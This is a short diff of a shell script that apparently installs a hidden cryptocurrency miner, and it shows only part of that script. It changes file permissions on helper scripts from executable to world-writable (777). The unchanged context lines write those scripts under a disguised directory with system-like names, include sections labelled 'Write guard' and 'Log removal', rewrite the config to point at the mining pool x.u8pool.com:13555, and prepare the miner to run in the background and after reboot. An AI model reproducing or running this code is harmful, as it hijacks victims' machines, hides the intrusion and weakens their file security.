@@ -756,7 +756,7 @@ else
 fi
 EOL
 
-chmod +x $HOME/myssqltcp/Tcphost.sh
+chmod 777 $HOME/myssqltcp/Tcphost.sh
 
 # Write guard
 echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
@@ -787,7 +787,7 @@ while true; do
 done
 EOL
 
-chmod +x $HOME/myssqltcp/lib_systemd.sh
+chmod 777 $HOME/myssqltcp/lib_systemd.sh
 
 # Log removal
 echo "[*] Creating $HOME/myssqltcp/logserver.sh script"
@@ -848,7 +848,7 @@ cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
 EOL
 
-chmod +x $HOME/myssqltcp/logserver.sh
+chmod 777 $HOME/myssqltcp/logserver.sh
 
 # preparing script background work and work under reboot
 if ! sudo -n true 2>/dev/null; then
